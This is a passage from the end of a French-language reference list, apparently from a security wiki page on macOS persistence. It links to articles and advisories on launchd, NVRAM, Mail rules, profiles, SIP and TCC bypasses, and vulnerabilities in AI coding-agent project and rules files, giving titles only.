- [40] [Au-delà des bons vieux LaunchAgents - 34 - tâches de démarrage launchd](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [Au-delà des bons vieux LaunchAgents - 35 - persister via la NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [Utiliser le courriel pour assurer la persistance sous OS X (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Modification suspecte du plist des règles d’Apple Mail (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Profils malveillants - l’une des menaces les plus graves pour les Mac (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [L’art des malwares Mac, vol. 1 - ch. 0x2 Persistance (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [Analyse de CVE-2024-44243, un contournement de SIP macOS via les extensions du noyau (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [RCE et exfiltration de jetons API via les fichiers de projet Claude Code (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [Nouvelle vulnérabilité dans GitHub Copilot et Cursor - porte dérobée dans le fichier Rules (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome - méthodes d’installation alternatives (extensions externes)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Supprimer ExtensionInstallForcelist dans Chrome sur Mac (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Écrire des plug-ins Sudo (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Exploitation à distance de Mac via des schémas d’URL personnalisés (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Deux astuces de persistance macOS exploitant des plug-ins (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [Exemple minimal de CoreMediaIO DAL (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight : analyse d’une vulnérabilité macOS TCC liée à Spotlight (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Documentation du module Python `site` (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
{{#include ../banners/hacktricks-training.md}}
